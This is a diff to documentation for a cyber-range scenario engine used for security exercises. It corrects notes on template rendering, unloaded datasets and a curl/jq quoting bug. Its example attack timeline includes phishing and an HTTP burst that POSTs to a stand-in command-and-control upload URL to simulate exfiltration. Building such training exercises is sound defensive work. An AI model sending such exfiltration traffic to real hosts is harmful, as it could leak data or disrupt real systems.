@@ -103,6 +103,11 @@ offset only positions them in exercise time. Both action dialects are accepted: 
 `email_phish` and the authored-content spelling `inject.email_phish`
 (`scenario_engine.injectors.canonical_action`).
 
+`{{ variables }}` placeholders do **not** render in timeline `params` — events go to the
+injector verbatim. They render only in an objective's `query`/`username` params
+(`scenario-engine/runner/run.py:166-168`; the API renders the same objective queries in
+`control-plane/api/app/detections/templating.py`). Put literal values in timeline params.
+
 ### Sequential Events
 
 ```yaml
@@ -502,7 +507,10 @@ and discards it). Pack files are validated as YAML with `id`/`injects`/`mitre_at
 
 ## Dataset Format
 
-Datasets provide pre-built telemetry events that can be loaded into OpenSearch at exercise start. They provide baseline "noise" or ground truth data.
+Datasets are pre-built telemetry events intended as baseline "noise" or ground-truth
+reference material. **UNKNOWN — not wired up:** like inject packs, they are not loaded
+into OpenSearch at exercise start or at any other time — nothing in the API or the worker
+reads them (`scripts/load_content.py:19-21`; no replay loader exists in the repo).
 
 ### Dataset Structure
 
@@ -563,10 +571,6 @@ name: apt-full-chain
 version: "1.0"
 range_template: medium-enterprise
 
-variables:
-  c2_domain: storage.attacker-infra.com
-  phish_user: finance_user
-
 timeline:
   # Phase 1: Initial Access
   - t: "0:00"
@@ -602,7 +606,8 @@ timeline:
   - t: "0:26"
     action: http_burst
     params:
-      target_url: "https://{{ c2_domain }}/upload"
+      # Timeline params are NOT template-rendered: a literal value here.
+      target_url: "https://storage.attacker-infra.com/upload"
       method: POST
       count: 25
 
@@ -679,7 +684,8 @@ curl -X POST http://127.0.0.1:8081/scenarios \
   -d "{
     \"name\": \"apt-full-chain\",
     \"version\": \"1.0\",
-    \"yaml\": \"$(cat content/scenarios/apt-full-chain/scenario.yaml | jq -Rs .)\",
+    # jq -Rs . already emits a quoted JSON string; quotes around it would be invalid JSON
+    \"yaml\": $(cat content/scenarios/apt-full-chain/scenario.yaml | jq -Rs .),
     \"is_public\": true
   }"
 
